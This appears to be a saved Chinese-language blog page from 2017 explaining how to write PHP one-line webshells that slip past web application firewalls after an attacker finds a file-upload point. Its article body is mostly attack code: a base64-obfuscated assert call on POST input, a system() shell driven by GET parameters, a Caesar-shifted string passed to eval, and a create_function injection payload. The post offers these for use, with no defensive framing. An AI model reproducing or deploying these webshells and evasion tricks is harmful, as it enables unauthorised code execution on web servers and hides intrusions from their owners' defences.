@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>一句话Shell编写思路 | iosmosis&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话Shell编写思路">
+<meta property="og:url" content="http://iosmosis.github.io/2017/03/05/oneshell/index.html">
+<meta property="og:site_name" content="iosmosis's blog">
+<meta property="og:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
+<meta property="og:updated_time" content="2017-03-07T07:12:33.970Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一句话Shell编写思路">
+<meta name="twitter:description" content="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 
+经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&amp;lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&amp;gt;这个一句话需要用到这个函数//base64_encode(">
+  
+    <link rel="alternative" href="/atom.xml" title="iosmosis&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">iosmosis</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/about">留言冒泡</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/iosmosis" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/ios-35/activities" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/5682776386" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="#" title="twitter">twitter</a>
+                            
+                                <a class="fl QQ" target="_blank" href="/2417117320" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://iosmosis.org/">iosmosis社区</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">纯海迷、爱运动、爱交友、爱旅行、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">iosmosis</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">iosmosis</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/about">留言冒泡</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/iosmosis" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ios-35/activities" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/u/5682776386" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="#" title="twitter">twitter</a>
+                    
+                        <a class="QQ" target="_blank" href="/2417117320" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-oneshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/03/05/oneshell/" class="article-date">
+      <time datetime="2017-03-05T04:47:01.000Z" itemprop="datePublished">2017-03-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一句话Shell编写思路
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 </p>
+<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
+<p>##system()的巧妙利用</p>
+<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system($_GET[‘a’]($_GET[‘b’]))</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kaisa</span><span class="params">($arr)</span></span>&#123;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-6</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-5</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>($arr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="keyword">eval</span>执行了</div><div class="line"> </div><div class="line"><span class="comment">/*注释多余的代码</span></div><div class="line"> </div><div class="line">最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">$args = "１";</div><div class="line">$code = "n;&#125;$_POST[x];/*";</div><div class="line">echo create_function('$args',$code);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()" title="关闭">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/03/05/oneshell/">一句话Shell编写思路</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 iosmosis 的个人博客">iosmosis</a></p>
+        <p><span>发布时间:</span>2017年03月05日 - 12时47分</p>
+        <p><span>最后更新:</span>2017年03月07日 - 15时12分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/05/oneshell/" title="一句话Shell编写思路">http://iosmosis.github.io/2017/03/05/oneshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://iosmosis.github.io/2017/03/05/oneshell/　　作者: iosmosis" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/03/07/str2-045/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#经典方式"><span class="toc-number">1.</span> <span class="toc-text">经典方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><span class="toc-number">1.1.</span> <span class="toc-text">应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用古典密码进行对shell加密"><span class="toc-number">2.</span> <span class="toc-text">利用古典密码进行对shell加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><span class="toc-number">2.1.</span> <span class="toc-text">在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><span class="toc-number">2.2.</span> <span class="toc-text">这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用函数代码执行来代替eval"><span class="toc-number">3.</span> <span class="toc-text">利用函数代码执行来代替eval</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><span class="toc-number">3.1.</span> <span class="toc-text">利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><span class="toc-number">3.2.</span> <span class="toc-text">这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="2017/03/05/oneshell/" data-title="一句话Shell编写思路" data-url="http://iosmosis.github.io/2017/03/05/oneshell/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:"null"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</div>
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/03/07/str2-045/" title="上一篇: Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/07/str2-045/">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/oneshell/">一句话Shell编写思路</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 iosmosis
+            </div>
+            <div class="footer-right">
+                <a href="http://iosmosis.github.io/" target="_blank">iosmosis's blog</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a>
+            </div>
+        </div>
+        <div class="visit">
+            <span id="busuanzi_container_site_pv" style='display:none'>
+                <span id="site-visit" >本站到访数: 
+                    <span id="busuanzi_value_site_uv"></span>
+                </span>
+            </span>
+            <span id="busuanzi_container_page_pv" style='display:none'>
+                <span id="page-visit">, 本页阅读量: 
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+            </span>
+        </div>
+    </div><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+</footer>
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
